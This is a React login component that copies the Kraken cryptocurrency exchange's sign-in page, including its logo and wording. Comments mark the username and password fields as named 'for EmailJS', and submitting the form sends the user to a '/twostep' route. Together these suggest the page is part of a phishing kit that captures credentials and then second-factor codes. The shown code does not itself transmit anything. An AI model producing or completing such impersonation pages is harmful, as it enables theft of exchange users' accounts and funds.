import React, { useRef } from "react";
import "./Login.css";
import kraken from "../../assets/kraken logo.png";
import { useNavigate } from "react-router";

const Login = () => {
  const navigate = useNavigate();
  const navigate1 = useNavigate();

  const handlesubmit = (e) => {
    e.preventDefault();
    navigate('/twostep')
  };
  
  const next = () => {
    navigate1('./')
  }

  return (
    <div className="loginbody">
      <div className="leftlogin"></div>
      <div className="rightlogin">
        <div className="loginnav">
          <div className="leftnavlogin">
            <img src={kraken} alt="" />
          </div>
          <div className="rightnavlogo">
            <button>U.S. English </button>
            <button className="createaccount" onClick={next}>Create Account</button>
          </div>
        </div>
        <form className="logincontainer" onSubmit={handlesubmit}>
          <h1>Sign in to Kraken</h1>
          <input
            className="text"
            type="text"
            name="username" // Add "name" attribute for EmailJS
            placeholder="Email or username"
            required
          />
          <input
            className="password"
            type="password"
            name="password" // Add "name" attribute for EmailJS
            placeholder="Password"
            required
          />
          <p>
            Forgot <span>password </span>or <span>username</span>?
          </p>
          <button>Continue</button>
          <p className="loginfootercontainer">
            Need help? <span>Contact Support</span>
          </p>
        </form>
        <p className="privacy">
          <li>Privacy Notice</li>
          <li>Terms of Service</li>
        </p>
      </div>
    </div>
  );
};

export default Login;
